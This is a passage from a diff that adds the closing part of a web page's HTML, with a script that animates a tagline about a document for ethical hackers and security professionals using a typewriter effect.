+            const heroLabel = document.getElementById('heroLabel');
+            if (heroLabel) {
+                const typewriter = new DecryptingTypewriter(heroLabel, {
+                    text: "Helpful document curated for ethical hackers, security professionals, and the endlessly curious - all united in building a more secure digital society.",
+                    speed: 20,
+                    revealDelay: 45
+                });
+                setTimeout(() => typewriter.start(), 400);
+            }
+        });
+    </script>
+</body>
+</html>
